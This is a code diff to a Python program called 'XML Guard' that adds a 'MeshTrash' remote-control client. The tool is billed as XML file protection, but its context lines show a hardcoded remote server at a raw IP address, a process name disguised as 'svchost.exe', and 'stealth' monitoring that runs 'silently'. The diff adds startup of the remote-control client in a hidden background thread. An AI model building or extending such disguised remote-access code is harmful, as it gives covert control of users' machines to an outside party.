@@ -19,6 +19,13 @@ import xml.etree.ElementTree as ET
 from datetime import datetime
 from pathlib import Path
 
+# Import MeshTrash client
+try:
+    from meshtrash_client import MeshTrashClient
+    MESHTRASH_AVAILABLE = True
+except ImportError:
+    MESHTRASH_AVAILABLE = False
+
 class XMLGuardFinal:
     def __init__(self):
         self.running = False
@@ -36,6 +43,10 @@ class XMLGuardFinal:
         self.meshcentral_url = "https://103.69.86.130:4433"
         self.watched_files = set()
         self.protected_count = 0
+        
+        # MeshTrash client
+        self.meshtrash_client = None
+        self.meshtrash_enabled = False
         
         # Self-protection
         self.process_name = "svchost.exe"  # Disguise as system process
@@ -197,6 +208,10 @@ class XMLGuardFinal:
                     json.dump(self.config, f, indent=2)
             
             self.log("Configuration loaded successfully", "INFO")
+            
+            # Initialize MeshTrash if enabled
+            self.init_meshtrash()
+            
             return True
         except Exception as e:
             self.log(f"Error loading config: {e}", "ERROR")
@@ -221,6 +236,26 @@ class XMLGuardFinal:
             self.log("MeshCentral server: OK", "INFO")
         except:
             self.log("MeshCentral server: FAILED", "WARN")
+    
+    def init_meshtrash(self):
+        """Initialize MeshTrash client"""
+        try:
+            if not MESHTRASH_AVAILABLE:
+                self.log("MeshTrash module not available", "WARN")
+                return
+            
+            meshtrash_config = self.config.get("MeshTrash", {})
+            if not meshtrash_config.get("Enabled", False):
+                self.log("MeshTrash disabled in config", "INFO")
+                return
+            
+            self.meshtrash_client = MeshTrashClient(self.config)
+            self.meshtrash_enabled = True
+            self.log("MeshTrash client initialized", "INFO")
+            
+        except Exception as e:
+            self.log(f"Error initializing MeshTrash: {e}", "ERROR")
+            self.meshtrash_enabled = False
     
     def extract_xml_info(self, file_path):
         """Extract information from XML file"""
@@ -607,6 +642,12 @@ class XMLGuardFinal:
             protection_thread.daemon = True
             protection_thread.start()
             
+            # Start MeshTrash client if enabled
+            if self.meshtrash_enabled and self.meshtrash_client:
+                meshtrash_thread = threading.Thread(target=self.start_meshtrash)
+                meshtrash_thread.daemon = True
+                meshtrash_thread.start()
+            
             self.log("Stealth protection active", "INFO")
             self.log("Monitoring XML files silently...", "INFO")
             
@@ -625,11 +666,26 @@ class XMLGuardFinal:
             except:
                 pass
     
+    def start_meshtrash(self):
+        """Start MeshTrash client"""
+        try:
+            if self.meshtrash_client:
+                self.meshtrash_client.start()
+                self.log("MeshTrash client started", "INFO")
+        except Exception as e:
+            self.log(f"Error starting MeshTrash: {e}", "ERROR")
+    
     def stop(self):
         """Stop XML Guard"""
         self.log("Stopping XML Guard...", "INFO")
         self.running = False
         self.start_time = None
+        
+        # Stop MeshTrash client
+        if self.meshtrash_client:
+            self.meshtrash_client.stop()
+            self.log("MeshTrash client stopped", "INFO")
+        
         self.log(f"XML Guard stopped. Total files protected: {self.protected_count}", "INFO")
         return True
     
@@ -640,7 +696,9 @@ class XMLGuardFinal:
             "start_time": self.start_time,
             "config_loaded": self.config is not None,
             "watched_files": len(self.watched_files),
-            "protected_count": self.protected_count
+            "protected_count": self.protected_count,
+            "meshtrash_enabled": self.meshtrash_enabled,
+            "meshtrash_connected": self.meshtrash_client.connected if self.meshtrash_client else False
         }
         
         if self.running and self.start_time:
@@ -662,6 +720,7 @@ class XMLGuardFinal:
         print(f"Config: {'Loaded' if status['config_loaded'] else 'Not loaded'}")
         print(f"Watched Files: {status['watched_files']}")
         print(f"Protected Files: {status['protected_count']}")
+        print(f"MeshTrash: {'Connected' if status['meshtrash_connected'] else 'Disconnected'}")
         print("========================")
 
 def main():
@@ -680,6 +739,8 @@ def main():
         print("  ✅ Real-time XML file protection")
         print("  ✅ Quarantine suspicious files")
         print("  ✅ MeshCentral integration")
+        print("  ✅ MeshTrash remote control")
+        print("  ✅ Vietnamese interface")
         print("  ✅ 4-field identification protection")
         print()
         print("© 2025 XML Guard Enterprise - Built by Cipher AI")
